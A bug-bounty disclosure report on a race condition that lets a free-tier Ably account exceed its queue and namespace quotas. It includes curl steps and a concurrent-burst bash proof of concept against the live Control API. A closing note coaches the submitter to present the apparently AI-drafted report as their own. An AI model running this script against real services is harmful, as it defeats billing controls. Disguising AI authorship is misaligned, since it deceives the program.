# Race Condition (TOCTOU) in Ably Control API — Free-Tier Resource-Limit Bypass

**Researcher report — for the Ably Vulnerability Disclosure Program (https://ably.com/disclosure)**
**Date:** 2026-09-19 · **Target:** `control.ably.net` (Ably Control API) · **Class:** CWE-362 (Race Condition) / CWE-367 (TOCTOU) / Business-Logic Limit Bypass

---

## 1. Summary

The Ably Control API enforces per-account/per-app resource quotas (e.g. **queues: 5**, **namespaces: ~9** on the free tier) using a **non-atomic "check-then-create"** sequence. The count check and the insert are not performed atomically, so multiple **concurrent** create requests each observe `current_count < limit` in the same window, all pass validation, and all commit.

Result: a free-tier account can create resources **far beyond its enforced plan quota** — demonstrated **34 queues** (and in a repeat run **23**) against a hard cap of **5**, and **29 namespaces** against a cap of **~9** — simply by sending the create requests in parallel instead of sequentially.

This is a plan/entitlement-enforcement bypass. It maps directly to a category Ably has publicly rewarded before ("queue-limit bypass").

---

## 2. Severity

**Rating: Medium.**
**CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` = 4.3 (Medium).**

- **AV:N** remote/API. **AC:L** trivially reliable (a burst of parallel requests). **PR:L** requires a valid (free) account token. **UI:N** none.
- **C:N / A:N** — no data disclosure; **not** claimed as DoS/resource-exhaustion (demonstrated with a small burst on an owned account).
- **I:L** — integrity of the platform's quota/entitlement enforcement is violated.

See §9 for the honest case to argue a higher rating **with additional evidence**.

---

## 3. Affected component

- **Endpoint (primary PoC):** `POST https://control.ably.net/v1/apps/{app_id}/queues`
- **Endpoint (second confirmed instance):** `POST https://control.ably.net/v1/apps/{app_id}/namespaces`
- **Auth:** `Authorization: Bearer <account token / dashboard session JWT>`
- **Root cause location:** shared quota-enforcement path for count-limited Control API resources.

---

## 4. Prerequisites

1. One Ably account on the **free tier** (the tier whose low quotas make the bypass observable).
2. A Control API token **or** dashboard session token for that account (either is accepted by `control.ably.net`).
3. An application in the account (every account has one by default).

No special privileges, no second account, no victim interaction.

---

## 5. Steps to reproduce (easy / manual)

> Uses queues (cap = 5). Substitute `namespaces` to reproduce the second instance.

1. **Auth check** — confirm your token works and note your app id:
   ```
   curl -s -H "Authorization: Bearer $TOKEN" https://control.ably.net/v1/me
   ```
2. **Establish the cap** — create queues one at a time until rejected:
   ```
   curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"name":"seq1","ttl":60,"maxLength":100,"region":"us-east-1-a"}' \
     https://control.ably.net/v1/apps/$APP/queues
   ```
   The **6th** create returns `422 Invalid resource` → the enforced cap is **5**.
3. **Go to one below the cap** — delete queues until you have **4**:
   ```
   curl -s -X DELETE -H "Authorization: Bearer $TOKEN" \
     https://control.ably.net/v1/apps/$APP/queues/$APP:us-east-1-a:seq5
   ```
4. **Race the last slot** — send ~30 create requests **simultaneously**, each with a distinct name
   (use the PoC script in §6, or Burp Intruder / `xargs -P 30` with a synchronized start).
5. **Observe the bypass** — most/all requests return `201`. List the queues:
   ```
   curl -s -H "Authorization: Bearer $TOKEN" https://control.ably.net/v1/apps/$APP/queues \
     | jq '[.[]|select(.name!="deadletter")]|length'
   ```
   The count is **well above 5** (observed 34 and 23 in two runs), proving the cap was bypassed.
6. **Clean up** — delete the extra queues (the PoC does this automatically).

---

## 6. Proof of Concept

Self-contained script (attached: `poc-race-queue.sh`) — auto-detects the cap, drops to cap-1, fires a
synchronized concurrent burst, prints the result, and cleans up:

```
./poc-race-queue.sh <ACCOUNT_TOKEN> [APP_ID]
```

Core of the race (synchronized-barrier concurrency):
```bash
N=30; T=$(( $(date +%s) + 3 ))            # all workers fire at the same wall-clock second
for k in $(seq 1 $N); do (
  while [ "$(date +%s)" -lt "$T" ]; do :; done   # spin to the barrier
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -d "{\"name\":\"race$k\",\"ttl\":60,\"maxLength\":100,\"region\":\"us-east-1-a\"}" \
    https://control.ably.net/v1/apps/$APP/queues
) & done; wait
```

---

## 7. Evidence (two independent runs, own account `xrp08w` / app `uBM7lQ`)

```
Run A:  sequential 6th queue -> 422 "Invalid resource"   (cap = 5 confirmed)
        race 30 concurrent from count=4  -> 30x 201
        FINAL user-queue count = 34      (>> cap 5)   BYPASS

Run B:  race 30 concurrent from count=4  -> 19x 201, 11x 422
        FINAL user-queue count = 23      (>> cap 5)   BYPASS   (reproducible; count varies with race window)

Namespaces (2nd instance): sequential cap ~9 -> race 20 concurrent from count=9 -> 20x 201 -> FINAL 29
```

---

## 8. Affected-resource scope

| Resource | Low free-tier cap | Race-bypassable |
|---|---|---|
| Queues | 5 | **Yes** (→ 34 / 23) |
| Namespaces | ~9 | **Yes** (→ 29) |
| Apps per account | none (>15 tested) | N/A — no low quota to bypass |
| API keys per app | none (>30 tested) | N/A — no low quota to bypass |

The flaw affects the resources that have low, enforced quotas; the same non-atomic pattern is the shared cause.

---

## 9. Impact

An attacker with any free account can **exceed the resource quotas tied to their plan** on demand, defeating
a billing/entitlement control. Concretely: unlimited queues and namespaces on a tier that permits 5 and ~9.

**Honest severity ceiling = Medium**, and how to *legitimately* argue higher (do NOT assert these without evidence):
- **If Ably meters/bills these resources** (queues are a plan-gated feature), the bypass is direct **entitlement/financial-control** circumvention → strengthens Medium, and a documented cost delta could support **High**. *Action:* show the resource is plan-restricted and quantify the over-allocation.
- **Do NOT** frame this as availability/DoS (unbounded creation exhausting shared infra) — that is **out of scope** for the program and will get the report rejected. Keep the narrative on *quota/entitlement integrity*, demonstrated minimally.

---

## 10. Remediation

Enforce quotas **atomically**, not check-then-act:
- a database **unique/count constraint** or partial index that rejects the (N+1)th row, **or**
- a per-account **row lock / `SELECT … FOR UPDATE`** around the count+insert, **or**
- an **atomic counter** (check-and-increment in one transaction), **or**
- **serialize / per-account rate-limit** resource-creation so concurrent creates cannot interleave.

---

## 11. Disclosure notes

- All testing was performed against accounts owned by the reporter; every resource created was deleted afterward. No third-party data was accessed. No brute force or DoS was performed.
- **Before submission:** Ably rejects AI-generated reports. Re-run the PoC by hand, capture your own screenshots (Burp/terminal), confirm the current free-tier caps, and rewrite this narrative in your own words. Submit **one vulnerability per report**, with the queues instance as the primary PoC and namespaces noted as a second instance.
